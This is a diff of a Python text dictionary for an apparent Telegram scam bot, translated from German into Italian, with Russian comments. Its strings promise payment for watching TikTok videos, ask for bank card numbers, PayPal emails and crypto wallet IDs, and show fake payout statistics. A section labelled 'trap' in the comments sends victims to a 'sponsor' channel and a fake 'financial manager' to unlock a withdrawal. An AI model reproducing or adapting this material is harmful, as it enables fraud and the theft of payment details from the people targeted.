@@ -1,137 +1,136 @@
 LEXICON = {
     # --- СТАРТ И ПРИВЕТСТВИЕ ---
     'welcome_msg': (
-        "👋 <b>Hallo, {name}!</b>\n\n"
-        "🔥 Wir verbinden TikTok-Content-Creator mit unseren Nutzern. "
-        "Verdiene Geld, indem du ihre Popularität steigerst.\n\n"
-        "👀 Für jeden TikTok-Aufruf zahlen wir dir <b>bis zu 2€</b>\n\n"
-        "☑️ Klicke auf <b>\"Ich bin informiert\"</b>, um sofort mit dem Verdienen zu beginnen."
+        "👋 <b>Ciao, {name}!</b>\n\n"
+        "🔥 Colleghiamo i creatori di contenuti TikTok con i nostri utenti. "
+        "Guadagna denaro aumentando la loro popolarità.\n\n"
+        "👀 Per ogni visualizzazione su TikTok, ti paghiamo <b>fino a 2€</b>\n\n"
+        "☑️ Clicca su <b>\"Sono informato\"</b> per iniziare a guadagnare subito."
     ),
-    'btn_informed': "✅ Ich bin informiert",
+    'btn_informed': "✅ Sono informato",
 
     # --- ЗАДАНИЯ (ВИДЕО) ---
     'video_task': (
-        "✅ <b>Aufruf registriert</b>\n"
-        "✳️ <b>Belohnung: +{reward} €</b>\n"
-        "✅ <b>Abgeschlossen: {current} von 15</b>\n\n"
-        "💰 <b>Dein Guthaben: {balance} €</b>\n\n"
-        "👇 <b>AKTION ERFORDERLICH:</b>\n{task_text}"
+        "✅ <b>Visualizzazione registrata</b>\n"
+        "✳️ <b>Premio: +{reward} €</b>\n"
+        "✅ <b>Completato: {current} di 15</b>\n\n"
+        "💰 <b>Il tuo saldo: {balance} €</b>\n\n"
+        "👇 <b>AZIONE RICHIESTA:</b>\n{task_text}"
     ),
     'task_like_dislike': {
-        'text': "Wähle eine Option mit den Schaltflächen unten:"
+        'text': "Scegli un'opzione usando i pulsanti qui sotto:"
     },
     'task_comment': {
-        'text': "✍️ <b>Schreibe einen Kommentar</b> (mindestens 15 Zeichen) direkt in diesen Chat, um die Mittel zu erhalten."
+        'text': "✍️ <b>Scrivi un commento</b> (minimo 15 caratteri) inviandolo direttamente in questa chat per ricevere i fondi."
     },
-    'alert_too_fast': "⚠️ Du hast das Video nicht bis zum Ende angeschaut!",
-    'btn_finish': "🏁 Sitzung beenden",
+    'alert_too_fast': "⚠️ Non hai guardato il video fino alla fine!",
+    'btn_finish': "🏁 Termina sessione",
     'finish_task': (
-        "🎉 <b>Arbeit abgeschlossen!</b>\n\n"
-        "Du hast alle 15 Videos angeschaut und <b>{balance} €</b> verdient!\n"
-        "🎁 Außerdem haben wir dir einen Willkommensbonus von <b>20 €</b> gutgeschrieben.\n\n"
-        "💳 <b>Gesamtguthaben zur Auszahlung: {total} €</b>"
+        "🎉 <b>Lavoro completato!</b>\n\n"
+        "Hai guardato tutti i 15 video e hai guadagnato <b>{balance} €</b>!\n"
+        "🎁 Inoltre, ti abbiamo accreditato un BONUS di benvenuto di <b>20 €</b>.\n\n"
+        "💳 <b>Saldo totale disponibile per il prelievo: {total} €</b>"
     ),
     'limit_reached': (
-        "⚠️ <b>Tageslimit erreicht!</b>\n\n"
-        "Du hast alle Aufgaben für heute erledigt. Komm morgen für neue Videos wieder oder hebe deine Einnahmen im Profil ab."
+        "⚠️ <b>Limite giornaliero raggiunto!</b>\n\n"
+        "Hai completato tutti i compiti per oggi. Torna domani per nuovi video o preleva i tuoi guadagni nel profilo."
     ),
 
-    'ask_binance': "✍️ <b>Binance Pay</b>\n\nGib deine USDT-Wallet-Adresse (TRC20/BEP20) oder deine Binance-ID ein:",
-    'ask_paypal': "✍️ <b>PayPal</b>\n\nGib die E-Mail-Adresse deines PayPal-Kontos ein:",
-    'ask_card': "✍️ <b>Bankkarte</b>\n\nGib deine Kartennummer ein (16 Ziffern):",
 
-    'invalid_details': "❌ <b>Fehler!</b>\nDie eingegebenen Daten scheinen ungültig zu sein. Gib eine korrekte Nummer ein:",
-    'processing_1': "⏳ <i>Verbindung zum Zahlungsgateway wird hergestellt...</i>",
-    'processing_2': "🔄 <i>Daten und Fondsverfügbarkeit werden überprüft...</i>",
+    'ask_binance': "✍️ <b>Binance Pay</b>\n\nInserisci l'indirizzo del tuo portafoglio USDT (TRC20/BEP20) o il tuo Binance ID:",
+    'ask_paypal': "✍️ <b>PayPal</b>\n\nInserisci l'indirizzo email associato al tuo conto PayPal:",
+    'ask_card': "✍️ <b>Carta Bancaria</b>\n\nInserisci il numero della tua carta (16 cifre):",
+
+    'invalid_details': "❌ <b>Errore!</b>\nI dati inseriti non sembrano validi. Inserisci un numero corretto:",
+    'processing_1': "⏳ <i>Connessione al gateway di pagamento in corso...</i>",
+    'processing_2': "🔄 <i>Verifica dei dati e della disponibilità dei fondi...</i>",
 
     # --- ЛОВУШКА И ПОДПИСКА ---
     'withdraw_trap': (
-        "✅ <b>Auszahlungsantrag genehmigt!</b>\n\n"
-        "💳 Details: <code>{details}</code>\n"
-        "💰 Betrag: <b>{balance} €</b>\n\n"
-        "Um die Überweisung freizuschalten und die Mittel zu erhalten, folge diesen 2 einfachen Schritten:\n\n"
-        "1️⃣ <b>Abonniere den Kanal unseres Sponsors:</b>\n"
-        "👉 <a href='https://t.me/+5ZEsXPYgyA9jZDQy'>KANAL-LINK</a>\n\n"
-        "2️⃣ <b>Schreibe unserem Finanzmanager</b> und bestätige deine Daten:\n"
-        "👉 <a href='https://t.me/AmaliaHoffman'>@AmaliaHoffman</a>\n\n"
-        "⏳ <i>Die Mittel werden innerhalb von 15 Minuten nach Überprüfung durch den Manager gesendet.</i>"
+        "✅ <b>Richiesta di prelievo approvata!</b>\n\n"
+        "💳 Dettagli: <code>{details}</code>\n"
+        "💰 Importo: <b>{balance} €</b>\n\n"
+        "Per sbloccare il bonifico e ricevere i fondi, segui questi 2 semplici passaggi:\n\n"
+        "1️⃣ <b>Iscriviti al canale del nostro sponsor:</b>\n"
+        "👉 <a href='https://t.me/+06DdEkcYVHtmYTIy'>LINK AL CANALE</a>\n\n"
+        "2️⃣ <b>Scrivi al nostro manager finanziario</b> confermando i tuoi dati:\n"
+        "👉 <a href='https://t.me/monica_guadagno'>@monica_guadagno</a>\n\n"
+        "⏳ <i>I fondi verranno inviati entro 15 minuti dalla verifica del manager.</i>"
     ),
-    'sub_required_text': "❌ <b>Zugang verweigert!</b>\n\nDu hast unseren offiziellen Kanal noch nicht abonniert. Abonniere ihn, um deine Mittel abheben zu können!",
-    'btn_subscribe': "📢 Kanal abonnieren",
-    'btn_check_sub_now': "🔄 Abonnement überprüfen",
-    'sub_success': "✅ <b>Ausgezeichnet!</b> Dein Abonnement wurde bestätigt. Jetzt kannst du den Manager kontaktieren.",
+    'sub_required_text': "❌ <b>Accesso negato!</b>\n\nNon sei ancora iscritto al nostro canale ufficiale. Iscriviti per poter prelevare i fondi!",
+    'btn_subscribe': "📢 Iscriviti al Canale",
+    'btn_check_sub_now': "🔄 Verifica Iscrizione",
+    'sub_success': "✅ <b>Ottimo!</b> La tua iscrizione è stata confermata. Ora puoi contattare il manager.",
 
     # --- БАЗА ВИДЕО ---
     'videos': [
-        'BAACAgEAAxkBAAMMajGnjbQ6sgvR52n5Xcb6ERhodWsAAugJAAImqWBFHy6zrS2-0tY8BA',
-        'BAACAgEAAxkBAAMTajGqrRaw_ApIyzfX9auTmeS57L0AAiUJAAJSWzlGpaTUKlvI2lc8BA',
-        'BAACAgEAAxkBAAMVajGqxlfsiNzHhskmKOFH-ikL3ZwAAiYJAAJSWzlGF_3Li8E_40Q8BA',
-        'BAACAgEAAxkBAAMXajGq3T3HgbBlV_-0SRUhKP88cOkAAicJAAJSWzlGot2zb8dR9448BA',
-        'BAACAgEAAxkBAAMZajGq9uki3wybK5lsG0rHMGMUFVsAAioJAAJSWzlGDOCcFONpu_Q8BA',
-        'BAACAgEAAxkBAAMbajGrDVc6Z3OewoJ8BCOof54OCSkAAigJAAJSWzlGM72e2hawLaw8BA',
-        'BAACAgEAAxkBAAMdajGrMOY4mnODPIFcc8GSZgb_FLkAAikJAAJSWzlGn-YxcrhsFu88BA',
-        'BAACAgEAAxkBAAMfajGrV-YTW0L_Tx8FhsSJlMFHhWsAAisJAAJSWzlGChM_56gXizg8BA',
-        'BAACAgEAAxkBAAMhajGrf8GLitqtvZ0Ol372nO7bhesAAiwJAAJSWzlGPxy0lXQpUC48BA',
-        'BAACAgEAAxkBAAMjajGrm9WnIhNt1V7y-S_mM02tdh0AAuYJAAImqWBFVRMNWja-ZvE8BA',
-        'BAACAgEAAxkBAAMlajGrsLwUsI5p88FaUGvo3gflBXkAAuoJAAImqWBFAca99kpg3AM8BA',
-        'BAACAgEAAxkBAAMnajGr0224gpbiPhcUi7v4Ma8X0usAAukJAAImqWBFqnA_RwPeX9Y8BA',
-        'BAACAgEAAxkBAAMpajGr68fT1ZMjXhb-Lr8EKsDk5vwAAucJAAImqWBFkhErFtT1LGI8BA',
-        'BAACAgEAAxkBAAMrajGsAhTTBkBkuj5cDjPNZVAuW3IAAuQJAAImqWBFuP2wpghPbls8BA',
-        'BAACAgEAAxkBAAMtajGsJI2fVZrXlu6XAAHS17ARUU31AALrCQACJqlgRd8oWQZJOxWUPAQ'
+        'BAACAgEAAxkBAANXacakC1GTaUiqrDCHgYoh22N2xnwAAmsGAAIewTlGy9NDmAcdppw6BA',
+        'BAACAgEAAxkBAAPRacb5nab4KUEYTlQOfbTA1Y3GtsoAAiUJAAJSWzlGLtT9NY4b97Q6BA',
+        'BAACAgEAAxkBAAPTacb5qdOuIwQp67p7Q9VsH1sAAaOXAAImCQACUls5Rpxg-0A8Bwe9OgQ',
+        'BAACAgEAAxkBAAPVacb5siJn72WRfI__aR3JWPUnzcEAAicJAAJSWzlGQi6ZwTBpIAY6BA',
+        'BAACAgEAAxkBAAICKGosXMD8QWx6Z0RR9YzSKib98WSPAALkCQACJqlgRbx0Fx4LuxTaPAQ',
+        'BAACAgEAAxkBAAPXacb5zOG5wCu6StQ5HPSUOXBh3J8AAigJAAJSWzlGmsvML1-Ke_c6BA',
+        'BAACAgEAAxkBAAPZacb51huQVdvCcfGdGEJ-9oAUNYMAAikJAAJSWzlGTIfHq99J4yA6BA',
+        'BAACAgEAAxkBAAPbacb53zRv-bWohc5vTavSfyCOUmkAAioJAAJSWzlGs9Dip931jdA6BA',
+        'BAACAgEAAxkBAAICKmosXNOoAQG7HIenyG8qUPkuawjgAALlCQACJqlgRZFsKGONZmOvPAQ',
+        'BAACAgEAAxkBAAICLGosXOIfoM5gxGjlPciBiVhhjvCLAALmCQACJqlgRRYZPvecuQ9kPAQ',
+        'BAACAgEAAxkBAAICLmosXTcxLJvQ6QABgmwEbtS23oNODgAC5wkAAiapYEVfH6Dcnt7EnTwE',
+        'BAACAgEAAxkBAAICMGosXWnBeAd1v0yJCcG7ibMC55LcAALoCQACJqlgRRYYBwIOFgQ8PAQ',
+        'BAACAgEAAxkBAAICMmosXXd9GXKU2Rc8SmCKFvNLsqcqAALpCQACJqlgRUXrxdE2aZcvPAQ',
+        'BAACAgEAAxkBAAICNGosXYQVSsSxrR0h4oaDST8Flz7yAALqCQACJqlgRYReiAc9oDGWPAQ',
+        'BAACAgEAAxkBAAICNmosXdDaIY1YoO4eppaZA9W9CG7sAALrCQACJqlgRZQkGjdBGZHtPAQ'
     ],
-
-    # --- ГЛАВНОЕ МЕНЮ ---
-    'main_menu_text': "Wähle eine Option aus dem Menü ⤵️",
-    'btn_earn': "🎵 Verdienen",
-    'btn_profile': "👤 Profil",
-    'btn_withdraw': "💰 Auszahlung",
+# --- ГЛАВНОЕ МЕНЮ (Как на скрине 3 и 4) ---
+    'main_menu_text': "Scegli l'opzione dal menù ⤵️",
+    'btn_earn': "🎵 Guadagna",
+    'btn_profile': "👤 Profilo",
+    'btn_withdraw': "💰 Prelievo",
     'btn_partners': "👥 Partner",
-    'btn_back': "🔙 Zurück",
+    'btn_back': "🔙 Indietro",
 
-    # --- ПРОФИЛЬ ---
+    # --- ПРОФИЛЬ (Как на скрине 5) ---
     'profile_text': (
-        "👤 <b>Deine Ergebnisse!</b>\n\n"
-        "Name: <b>{name}</b>\n"
-        "Benutzername: <b>@{username}</b>\n"
-        "Status: ✅ Verifiziert\n"
-        "Guthaben: <b>{balance} €</b>\n"
-        "Aufrufe: <b>{video_count}</b>\n"
-        "Eingeladene Freunde: <b>0</b>\n\n"
-        "Das haben wir erreicht 🥇\n"
-        "Statistiken für heute:\n"
-        "👶 Teilnehmer: 98.241 Personen.\n"
-        "💶 Ausgezahlter Betrag: 15.320.890 €.\n"
-        "🎥 Gesamtaufrufe: 412.750 Videos.\n\n"
-        "⏱ <i>Nächste Aktualisierung in 24 Stunden...</i>"
+        "👤 <b>I tuoi risultati!</b>\n\n"
+        "Nome: <b>{name}</b>\n"
+        "Nome utente: <b>@{username}</b>\n"
+        "Status: ✅ Verificato\n"
+        "Saldo: <b>{balance} €</b>\n"
+        "Visualizzazioni: <b>{video_count}</b>\n"
+        "Amici invitati: <b>0</b>\n\n"
+        "Iată ce am realizat 🥇\n" # Оставил легкий шарм, но дальше перевел
+        "Statistiche per oggi:\n"
+        "👶 Partecipanti: 123.853 persone.\n"
+        "💶 Somma pagata: 20.140.642 €.\n"
+        "🎥 Visualizzazioni totali: 530.016 videoclipuri.\n\n"
+        "⏱ <i>Prossimo aggiornamento in 24 ore...</i>"
     ),
 
-    # --- ВЫВОД СРЕДСТВ ---
+    # --- ВЫВОД СРЕДСТВ (Как на скрине 7) ---
     'withdraw_text': (
-        "💰 Guthaben: <b>{balance} €</b>\n"
-        "Möchtest du deine Mittel abheben?\n\n"
-        "Oder verdiene vorher noch mehr:\n"
-        "💰 +25 € mit der Aktion „Freunde einladen.\n"
-        "💶 +10 € durch das Anschauen von Videos und die Unterstützung von Bloggern.\n"
-        "🤑 Ab 50 € - Bonus des Partnerprogramms."
+        "💰 Saldo: <b>{balance} €</b>\n"
+        "Vuoi prelevare i fondi?\n\n"
+        "O, prima di farlo, puoi guadagnare:\n"
+        "💰 +25 € con l'azione „Invita amici”.\n"
+        "💶 +10 € guardando i video e aiutando i blogger.\n"
+        "🤑 a partire da 50 € - bonus del programma di affiliazione."
     ),
-    'btn_phone': "📱 Telefon",
+    'btn_phone': "📱 Telefono",
     'btn_paypal': "🅿️ PayPal",
     'btn_binance': "🔶 Binance",
-    'btn_card': "💳 Karte",
+    'btn_card': "💳 Carta",
 
-    # --- ВВОД РЕКВИЗИТОВ ---
+    # --- ВВОД РЕКВИЗИТОВ (Как на скрине 8) ---
     'ask_wallet_generic': (
-        "💳 <b>Gib deine Daten für die Überweisung ein.</b>\n"
-        "Banken - Deutsche Bank, Sparkasse, Commerzbank, DKB, N26\n\n"
-        "🔒 <i>Die Sicherheit der Transaktionen hat für uns höchste Priorität. Zufriedene Nutzer sind die beste Empfehlung für den TikTok-Bot.</i>"
+        "💳 <b>Inserisci i tuoi dati per il trasferimento.</b>\n"
+        "Banche - Revolut, Raiffeisen, Wise, Intesa, UniCredit\n\n"
+        "🔒 <i>La sicurezza delle transazioni è la nostra priorità principale. Gli utenti soddisfatti sono la migliore raccomandazione per il bot di TikTok.</i>"
     ),
-
-    # --- ПАРТНЁРЫ ---
+    # --- РАЗДЕЛ ПАРТНЕРЫ (ОДИН КАНАЛ) ---
     'partners_text': (
-        "🤝 <b>Unser offizieller Partner</b>\n\n"
-        "Tritt dem Kanal unseres Partners bei, um exklusive Boni, "
-        "neue Verdienstmöglichkeiten und tägliche Zahlungsbeweise nicht zu verpassen!\n\n"
-        "👇 <i>Klicke unten, um zu abonnieren:</i>"
+        "🤝 <b>Il nostro Partner Ufficiale</b>\n\n"
+        "Unisciti al canale del nostro partner per non perdere bonus esclusivi, "
+        "nuovi modi per guadagnare e prove di pagamento giornaliere!\n\n"
+        "👇 <i>Clicca qui sotto per iscriverti:</i>"
     ),
-    'btn_partner_channel': "📢 Offizieller Kanal",
+    'btn_partner_channel': "📢 Canale Ufficiale",
 }
